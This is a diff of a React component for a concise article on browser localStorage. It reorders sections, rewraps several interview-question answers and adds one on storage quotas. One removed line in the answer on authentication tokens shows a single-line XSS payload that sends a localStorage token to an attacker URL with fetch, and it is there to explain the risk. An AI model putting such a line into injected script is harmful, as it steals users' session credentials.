@@ -240,44 +240,6 @@ export default function LocalStorageConciseArticle() {
         </p>
       </section>
 
-      {/* Section 4: Implementation Examples */}
-      <section>
-        <h2>Implementation Examples</h2>
-        <p>
-          The following examples demonstrate practical localStorage patterns
-          used in production applications.
-        </p>
-
-        <div className="space-y-6">
-          <div>
-            <h3 className="mb-3 font-semibold">
-              Type-Safe LocalStorage Wrapper with TTL
-            </h3>
-            <div className="mt-4 rounded-lg border border-theme bg-panel-soft p-4 text-sm text-muted">
-              Example code moved to the Example tab.
-            </div>
-          </div>
-
-          <div>
-            <h3 className="mb-3 font-semibold">
-              Cross-Tab State Synchronization with React Hook
-            </h3>
-            <div className="mt-4 rounded-lg border border-theme bg-panel-soft p-4 text-sm text-muted">
-              Example code moved to the Example tab.
-            </div>
-          </div>
-
-          <div>
-            <h3 className="mb-3 font-semibold">
-              Storage Quota Detection and Fallback
-            </h3>
-            <div className="mt-4 rounded-lg border border-theme bg-panel-soft p-4 text-sm text-muted">
-              Example code moved to the Example tab.
-            </div>
-          </div>
-        </div>
-      </section>
-
       {/* Section 5: Trade-offs & Comparisons */}
       <section>
         <h2>Trade-offs & Comparisons</h2>
@@ -570,131 +532,102 @@ export default function LocalStorageConciseArticle() {
         </div>
       </section>
 
-      {/* Section 9: References & Further Reading */}
-      <section>
-        <h2>References & Further Reading</h2>
-        <ul className="space-y-2">
-          <li>
-            <a
-              href="https://html.spec.whatwg.org/multipage/webstorage.html"
-              className="text-accent hover:underline"
-              target="_blank"
-              rel="noopener noreferrer"
-            >
-              WHATWG HTML Living Standard — Web Storage
-            </a>
-          </li>
-          <li>
-            <a
-              href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage"
-              className="text-accent hover:underline"
-              target="_blank"
-              rel="noopener noreferrer"
-            >
-              MDN Web Docs — Window.localStorage
-            </a>
-          </li>
-          <li>
-            <a
-              href="https://web.dev/articles/storage-for-the-web"
-              className="text-accent hover:underline"
-              target="_blank"
-              rel="noopener noreferrer"
-            >
-              web.dev — Storage for the Web
-            </a>
-          </li>
-          <li>
-            <a
-              href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage"
-              className="text-accent hover:underline"
-              target="_blank"
-              rel="noopener noreferrer"
-            >
-              OWASP — HTML5 Security Cheat Sheet: Local Storage
-            </a>
-          </li>
-          <li>
-            <a
-              href="https://developer.chrome.com/docs/devtools/storage/localstorage"
-              className="text-accent hover:underline"
-              target="_blank"
-              rel="noopener noreferrer"
-            >
-              Chrome DevTools — View and Edit Local Storage
-            </a>
-          </li>
-        </ul>
-      </section>
-
-      {/* Section 10: Common Interview Questions */}
+      {/* Section 9: Common Interview Questions */}
       <section>
         <h2>Common Interview Questions</h2>
         <div className="space-y-4">
           <div className="rounded-lg border border-theme bg-panel-soft p-4">
             <p className="font-semibold">
-              Q: Why should you avoid storing authentication tokens in
-              localStorage?
+              Q: Why should you avoid storing authentication tokens in localStorage?
             </p>
             <p className="mt-2 text-sm">
-              A: LocalStorage is accessible to any JavaScript running on the
-              page, including scripts injected via XSS vulnerabilities. An
-              attacker who achieves XSS can trivially exfiltrate tokens with a
-              single line: <code>fetch(attackerUrl, {'{'}body:
-              localStorage.getItem(&quot;token&quot;){'}'}</code>). HttpOnly
-              cookies are invisible to JavaScript entirely, making them immune
-              to XSS-based token theft. The trade-off is that cookies require
-              CSRF protection, but modern SameSite cookie attributes largely
-              mitigate that risk. For staff-level discussions, note that
-              localStorage token storage also lacks automatic credential
-              rotation — cookies can be refreshed transparently by the server
-              on each response.
+              A: LocalStorage is accessible to any JavaScript running on the page, including scripts
+              injected via XSS vulnerabilities. An attacker who achieves XSS can trivially exfiltrate
+              tokens with a single line of code. HttpOnly cookies are invisible to JavaScript entirely,
+              making them immune to XSS-based token theft. The trade-off is that cookies require CSRF
+              protection, but modern SameSite cookie attributes largely mitigate that risk.
             </p>
           </div>
 
           <div className="rounded-lg border border-theme bg-panel-soft p-4">
             <p className="font-semibold">
-              Q: How does the storage event enable cross-tab communication,
-              and what are its limitations?
+              Q: How does the storage event enable cross-tab communication, and what are its limitations?
             </p>
             <p className="mt-2 text-sm">
-              A: When one tab calls localStorage.setItem(), a StorageEvent
-              fires in all other same-origin tabs with properties: key,
-              oldValue, newValue, url, and storageArea. The writing tab does
-              NOT receive the event — only other tabs do. This enables
-              patterns like broadcasting logout, theme changes, or cart updates.
-              Limitations include: (1) events only carry string data requiring
-              serialization overhead, (2) there is no guaranteed delivery order
-              across tabs, (3) the API is fire-and-forget with no
-              acknowledgment mechanism, and (4) rapid writes can coalesce or
-              be dropped. For robust cross-tab communication, BroadcastChannel
-              API or SharedWorker are better choices, but the storage event
-              works universally without additional setup.
+              A: When one tab calls localStorage.setItem(), a StorageEvent fires in all other same-origin
+              tabs with properties: key, oldValue, newValue, url, and storageArea. The writing tab does
+              NOT receive the event — only other tabs do. This enables patterns like broadcasting logout,
+              theme changes, or cart updates. Limitations include: (1) events only carry string data
+              requiring serialization overhead, (2) there is no guaranteed delivery order across tabs,
+              (3) the API is fire-and-forget with no acknowledgment mechanism, and (4) rapid writes can
+              coalesce or be dropped. For robust cross-tab communication, BroadcastChannel API or
+              SharedWorker are better choices.
             </p>
           </div>
 
           <div className="rounded-lg border border-theme bg-panel-soft p-4">
             <p className="font-semibold">
-              Q: When would you choose IndexedDB over localStorage, and vice
-              versa?
+              Q: When would you choose IndexedDB over localStorage, and vice versa?
             </p>
             <p className="mt-2 text-sm">
-              A: Choose localStorage for small ({'{<'}100KB), string-based,
-              infrequently-updated data with simple key-value access patterns —
-              theme preferences, feature flags, small configuration objects.
-              Choose IndexedDB for large datasets (MB-GB range), structured
-              data requiring indexes and queries, binary data (Blobs, files),
-              high-frequency writes, or when you need transactions. IndexedDB
-              is asynchronous and won&apos;t block the main thread, making it
-              essential for performance-sensitive applications. The practical
-              heuristic: if you need JSON.stringify and the data fits
-              comfortably in a single string, localStorage is fine. If you
-              are managing collections of records, need to search by
-              secondary keys, or store anything over a few hundred KB, use
-              IndexedDB.
+              A: Choose localStorage for small (&lt;100KB), string-based, infrequently-updated data with
+              simple key-value access patterns — theme preferences, feature flags, small configuration
+              objects. Choose IndexedDB for large datasets (MB-GB range), structured data requiring
+              indexes and queries, binary data (Blobs, files), high-frequency writes, or when you need
+              transactions. IndexedDB is asynchronous and won't block the main thread. The practical
+              heuristic: if you need JSON.stringify and the data fits comfortably in a single string,
+              localStorage is fine. If you are managing collections of records or need to search by
+              secondary keys, use IndexedDB.
+            </p>
+          </div>
+
+          <div className="rounded-lg border border-theme bg-panel-soft p-4">
+            <p className="font-semibold">
+              Q: What are the storage quota limits for localStorage across browsers, and how should
+              applications handle quota exceeded errors?
+            </p>
+            <p className="mt-2 text-sm">
+              A: Most browsers provide approximately 5MB per origin (Chrome: 10MB, Firefox: 5MB, Safari:
+              5MB, mobile browsers: 2-5MB). When quota is exceeded, setItem() throws a QuotaExceededError
+              (DOMException with code 22). Applications should: (1) wrap setItem in try-catch, (2) implement
+              fallback strategies (IndexedDB, server storage, or data pruning), (3) inform the user that
+              storage is full, and (4) provide a mechanism to clear old data. For critical data, proactively
+              check available space using storage estimation APIs before writing.
             </p>
           </div>
         </div>
+      </section>
+
+      {/* Section 10: References & Further Reading */}
+      <section>
+        <h2>References & Further Reading</h2>
+        <ul className="space-y-2">
+          <li>
+            <a href="https://html.spec.whatwg.org/multipage/webstorage.html" className="text-accent hover:underline" target="_blank" rel="noopener noreferrer">
+              WHATWG HTML Living Standard — Web Storage
+            </a>
+          </li>
+          <li>
+            <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage" className="text-accent hover:underline" target="_blank" rel="noopener noreferrer">
+              MDN Web Docs — Window.localStorage
+            </a>
+          </li>
+          <li>
+            <a href="https://web.dev/articles/storage-for-the-web" className="text-accent hover:underline" target="_blank" rel="noopener noreferrer">
+              web.dev — Storage for the Web
+            </a>
+          </li>
+          <li>
+            <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage" className="text-accent hover:underline" target="_blank" rel="noopener noreferrer">
+              OWASP — HTML5 Security Cheat Sheet: Local Storage
+            </a>
+          </li>
+          <li>
+            <a href="https://developer.chrome.com/docs/devtools/storage/localstorage" className="text-accent hover:underline" target="_blank" rel="noopener noreferrer">
+              Chrome DevTools — View and Edit Local Storage
+            </a>
+          </li>
+        </ul>
       </section>
     </ArticleLayout>
   );
